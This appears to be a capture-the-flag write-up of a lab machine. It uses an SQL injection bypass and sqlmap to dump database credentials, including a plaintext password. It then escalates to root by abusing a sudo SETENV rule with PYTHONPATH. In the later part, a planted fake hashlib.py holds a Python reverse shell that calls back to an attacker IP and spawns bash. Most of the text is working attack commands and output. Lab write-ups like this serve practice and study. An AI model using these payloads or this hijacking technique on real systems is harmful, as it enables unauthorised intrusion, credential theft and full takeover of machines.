---
tags:
  - web
  - SQLi
  - python
  - Path_hijacking
  - SETENV
---

We will start with nmap, and found 2 ports 22 ,8000.

port 8000 contain http service and it has only login page, so we tried sqli on it
```
') or 1=1-- -
```

using sqlmap we were able to retrive creds:
```
sqlmap -r sql --level 5 --risk 3 --dump --technique T

[23:25:09] [INFO] fetching columns for table 'users' in database 'website'
[23:25:09] [INFO] retrieved: 4
[23:25:20] [INFO] retrieved: email
[23:26:57] [INFO] retrieved: id
[23:27:44] [INFO] retrieved: password
[23:30:52] [INFO] retrieved: username
[23:33:26] [INFO] fetching entries for table 'users' in database 'website'
[23:33:26] [INFO] fetching number of entries for table 'users' in database 'website'
[23:33:26] [INFO] retrieved: 3
[23:33:48] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
smok
[23:36:15] [ERROR] invalid character detected. retrying..
ey@email.boop
[23:41:12] [INFO] retrieved: 1
[23:41:32] [INFO] retrieved: My_P@ssW0rd123
```

smokey : My_P@ssW0rd123

We found another user named `hazel`, we tried password `hazel` and it worked.

---

now `hazel` can run this:
```sh
sudo -l
Matching Defaults entries for hazel on ip-10-10-56-135:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hazel may run the following commands on ip-10-10-56-135:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /home/hazel/hasher.py

cat hasher.py
import hashlib

def hashing(passw):
    md5 = hashlib.md5(passw.encode())
    print("Your MD5 hash is: ", end ="")
    print(md5.hexdigest())
    
    sha256 = hashlib.sha256(passw.encode())
    print("Your SHA256 hash is: ", end ="")
    print(sha256.hexdigest())
    
    sha1 = hashlib.sha1(passw.encode())
    print("Your SHA1 hash is: ", end ="")
    print(sha1.hexdigest())
def main():
    passw = input("Enter a password to hash: ")
    hashing(passw)

if __name__ == "__main__":
    main()


```

SETENV give me the ability to change the path of the binaries. python use `PYTHONPATH` variable,  and we have the privilege to do so like this:
```sh
sudo PYTHONPATH=/tmp /usr/bin/python3 /home/hazel/hasher.py
```

now inside `/tmp` we will create python script with the same name as `hashlib.py` and has the same functions inside `hasher.py`.
```sh
nano /tmp/hashlib.py
```

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);

def md5(*args):
	s.connect(("10.4.104.91",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
def sha1(*args):
	print('hello')
def sha256(*args):
	print('hello')
```

Now run it and get root shell
```sh
sudo PYTHONPATH=/tmp /usr/bin/python3 /home/hazel/hasher.py
```